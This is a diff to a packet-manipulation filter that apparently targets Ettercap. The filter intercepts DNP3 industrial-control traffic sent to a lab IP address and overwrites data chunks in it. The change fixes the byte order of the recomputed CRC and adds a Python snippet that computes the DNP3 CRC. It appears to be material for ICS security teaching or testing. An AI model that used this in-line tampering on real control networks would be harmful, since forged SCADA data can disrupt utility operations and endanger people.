@@ -1,10 +1,21 @@
 ###########################################
 # Name: dnp3-replace-chunks.filter
-# Description: Replace data in DNP3 messages
+# Description: Replace data chunks in DNP3 messages
+#              Wireshark shows these starting at byte 'frame[75:]
+#              These are 16 byte chunks with a 2 byte 'crc-16-dnp' CRC 
+#              in little-endian order 
 #
 # Created by: Don C. Weber (@cutaway)
 # Date Created: November 2022
 # Version: 0.1
+# 
+# Calculating DNP3 CRC using Python
+# import crcmod.predefined
+# crcdnp = crcmod.predefined.mkCrcFun('crc-16-dnp')
+# data = '01010101010101010101010101010101'
+# hex(crcdnp(bytes.fromhex(data)))
+# '0xc3bb' <- Output. Flip these bytes to little-endian for the packet data '\xbb\xc3' 
+#
 ###########################################
 
 # Checking to see if the destination is the server and the protocol is DNP3
@@ -15,9 +26,9 @@ if (ip.dst == '192.168.0.21') {
         # Check for DNP3 message and a DNP3 data with length 37. 
         if (DATA.data == "\x05\x64\x65\x44"){
             # Overwrite DNP3 packet data
-            DATA.data + 28 = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb";
+            DATA.data + 28 = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xbb\xc3";
             # Printing a message when the filter fires.
-            msg("Updated DNP3 data with \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb");
+            msg("Updated DNP3 data with \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xbb\xc3");
         }
     }
 }
